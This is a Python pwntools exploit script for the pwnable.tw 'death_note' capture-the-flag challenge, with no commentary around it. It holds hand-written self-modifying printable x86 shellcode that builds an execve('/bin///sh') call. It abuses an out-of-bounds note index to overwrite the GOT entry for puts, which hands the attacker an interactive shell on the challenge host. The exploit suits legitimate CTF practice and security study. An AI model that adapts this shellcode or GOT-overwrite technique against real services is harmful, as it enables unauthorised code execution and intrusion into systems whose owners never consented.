from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwnabletw_death_note")
	elf = ELF("./pwnabletw_death_note")
else:
	p = remote("chall.pwnable.tw","10201")
	elf = ELF("./pwnabletw_death_note")

def add(index,name):
	p.sendafter("Your choice :","1")
	p.sendafter("Index :",str(index))
	p.sendafter("Name :",name)
	p.recvuntil("Done !\n")

def exit():
	p.sendafter("Your choice :","4")

def debugf():
	gdb.attach(p,"b *0x080489CD")

shellcode = '''
    /* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl
    /*set zero to edx*/
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
  /*foo order,for holding the  place*/
    push edx
    pop edx
    push edx
    pop edx
'''
shellcode = asm(shellcode) + '\x6b\x40'

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
s1 = shellcode
note_addr = 0x0804A060
puts_got = elf.got["puts"]
index = (puts_got - note_addr) / 4
#debugf()
add(index,s1)
p.interactive()
